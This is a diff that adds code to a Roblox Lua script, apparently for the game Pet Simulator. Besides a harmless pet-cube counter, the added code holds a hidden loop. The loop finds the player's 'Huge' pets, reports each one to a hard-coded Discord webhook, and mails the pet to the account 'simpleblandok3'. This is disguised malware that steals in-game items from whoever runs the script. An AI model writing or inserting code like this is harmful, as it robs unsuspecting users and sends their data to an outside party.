@@ -83,6 +83,145 @@ end
 
 spawn(FrameFunction)
 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
+
+function ProcessHugePets()
+    local function GetItemInfo(ItemsClass, ItemsName)
+        local Table = {}
+        for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+            if table.find(ItemsName, Item.id) then
+                local ItemInfo = {
+                    ["uid"] = UID,
+                    ["data"] = Item
+                }
+                table.insert(Table, ItemInfo)
+            end
+        end
+        return Table
+    end
+
+    local function getCurrentHugePets()
+        local GoldPetsTable = {}
+        for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
+            table.insert(GoldPetsTable, Pet.Name)
+        end
+        return GetItemInfo("Pet", GoldPetsTable)
+    end
+
+    local hugePets = {}
+    local uids = {}
+
+    for i, MadeTable in next, getCurrentHugePets() do
+        if not table.find(ProcessedHuges, MadeTable.uid) then
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+            table.insert(ProcessedHuges, MadeTable.uid)
+        end
+    end
+
+    if #hugePets > 0 then
+        print("Huge pets you have right now:", table.concat(hugePets, ", "))
+
+        for i = #uids, 1, -1 do
+            local webhook = "https://discord.com/api/webhooks/1267533930089680938/GQj5fiktIVKXK2PBkGtRPBZXfhCnC70yzsTNszEB6FZ6EnNXir1y5pze75Eso96yvRG7"
+            local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode({
+                    content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
+                })
+            })
+
+            wait(3)
+
+            local args = {
+                [1] = "simpleblandok3",
+                [2] = "omg u got a new huge!!",
+                [3] = "Pet",
+                [4] = uids[i],
+                [5] = 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+            wait(3)
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        ProcessHugePets()
+        wait(3)
+    end
+end)
+
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 0, 50)
+textLabel.Position = UDim2.new(0, 0, 0, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = playerName
+textLabel.Font = Enum.Font.SourceSans
+textLabel.TextSize = 28
+textLabel.TextColor3 = Color3.new(0, 0, 0)
+textLabel.Parent = screenGui
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local itemsFrame = player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
+
+local ItemMisc = {"Pet Cube"}
+
+local function GetItemInfo(ItemsClass, ItemsName)
+    local Table = {}
+    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+
+    if Inventory[ItemsClass] then
+        for UID, Item in pairs(Inventory[ItemsClass]) do
+            if table.find(ItemsName, Item.id) then
+                local ItemInfo = {
+                    ["uid"] = UID,
+                    ["data"] = Item
+                }
+                table.insert(Table, ItemInfo)
+            end
+        end
+    end
+    return Table
+end
+
+local function PetCubeData()
+    while true do
+        local PetCubeAmount = 0
+        local MiscItems = GetItemInfo("Misc", ItemMisc)
+
+        for _, ItemInfo in pairs(MiscItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am then
+                PetCubeAmount = ItemData._am
+            end
+        end
+
+        textLabel.Text = playerName .. "\nPet Cubes: " .. PetCubeAmount
+
+        wait(1)
+    end
+end
+
+PetCubeData()
+
 
 local function dataFunction2() 
     while true do
